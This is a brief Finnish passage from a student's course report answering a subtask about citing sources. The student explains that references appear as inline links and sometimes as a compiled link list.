#### e) Viittaa. Tarkista, että jokaisessa raportissasi on lähdeviitteet kunnossa. Jokaisen raportin tulee viitata ainakin kurssiin / tehtäväsivuun. Kaikkiin muihinkin käytettyihin lähteisiin tulee viitata, kuten kurssikavereiden raportteihin, weppisivuihin, man-sivuihin... (Tässä alatehtävässä ei tarvitse tehdä testejä koneella).

Lähdeviitteeni on merkittynä tekstin seassa suorina linkkeinä lähteisiin, ja joillakin viikoilla olen myös koostanut linkeistä luettelon. Tässä raportointiformaatissa tekstin seassa tehtävä viittaus linkkeineen on riittävä käytänne.
